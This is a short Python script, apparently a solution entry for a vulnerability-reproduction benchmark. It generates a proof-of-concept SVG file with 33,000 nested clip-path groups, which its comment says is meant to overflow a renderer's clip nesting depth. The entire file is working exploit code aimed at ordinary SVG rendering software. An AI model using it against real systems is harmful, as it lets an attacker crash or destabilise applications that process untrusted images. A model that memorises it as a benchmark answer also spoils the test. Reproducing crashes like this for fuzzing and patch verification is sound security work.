import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate an SVG with deep nested clip groups to trigger unbounded clip mark nesting
        n = 33000  # exceed typical 16-bit depth threshold safely while keeping size < ~1MB
        s = io.StringIO()
        s.write('<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">')
        s.write('<defs><clipPath id="c"><rect x="0" y="0" width="16" height="16"/></clipPath></defs>')
        open_tag = '<g clip-path="url(#c)">'
        close_tag = '</g>'
        s.write(open_tag * n)
        s.write('<rect x="1" y="1" width="1" height="1" fill="#000"/>')
        s.write(close_tag * n)
        s.write('</svg>')
        return s.getvalue().encode('utf-8')
